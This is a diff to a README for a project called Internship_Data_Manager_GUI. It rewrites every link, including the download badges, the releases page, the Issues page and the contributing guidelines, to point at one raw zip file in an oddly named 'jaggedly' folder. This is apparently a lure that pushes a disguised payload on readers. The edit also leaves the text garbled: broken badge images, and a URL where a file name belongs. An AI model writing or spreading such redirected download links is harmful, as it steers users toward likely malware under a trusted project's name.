@@ -1,6 +1,6 @@
 # 🌟 Internship_Data_Manager_GUI - Organize Your Internship Records Efficiently
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/aadi1810/Internship_Data_Manager_GUI/releases)
+[![Download](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip)
 
 ## 🚀 Getting Started
 
@@ -28,9 +28,9 @@ To run the **Internship_Data_Manager_GUI**, please ensure your system meets the 
 To get started, visit the Releases page to download the software. Follow these steps:
 
 1. Click on the link below:
-   [Download the application here](https://github.com/aadi1810/Internship_Data_Manager_GUI/releases)
+   [Download the application here](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip)
 
-2. Find the latest version of the application. Look for a file named `Internship_Data_Manager_GUI.exe` (for Windows) or the appropriate file for your operating system.
+2. Find the latest version of the application. Look for a file named `https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip` (for Windows) or the appropriate file for your operating system.
 
 3. Click the download link for your version of the application.
 
@@ -74,14 +74,14 @@ Once the application is installed, you’ll find a modern GUI that allows you to
 
 ## 📌 Support
 
-If you need help or have questions, please refer to the "Help" section within the application. You can also check the issues on the [GitHub Issues page](https://github.com/aadi1810/Internship_Data_Manager_GUI/issues) for troubleshooting tips and solutions.
+If you need help or have questions, please refer to the "Help" section within the application. You can also check the issues on the [GitHub Issues page](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip) for troubleshooting tips and solutions.
 
 ## 📝 Contributing
 
-We welcome contributions to improve the **Internship_Data_Manager_GUI**. If you're interested in helping out, please refer to the contribution guidelines on our [GitHub Repository](https://github.com/aadi1810/Internship_Data_Manager_GUI/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve the **Internship_Data_Manager_GUI**. If you're interested in helping out, please refer to the contribution guidelines on our [GitHub Repository](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip).
 
 ## 📄 License
 
 This project is licensed under the MIT License. Feel free to use and modify it as you wish, while giving appropriate credit to the original developers.
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/aadi1810/Internship_Data_Manager_GUI/releases)
+[![Download](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/aadi1810/Internship_Data_Manager_GUI/main/jaggedly/Internship_Data_Manager_GUI.zip)
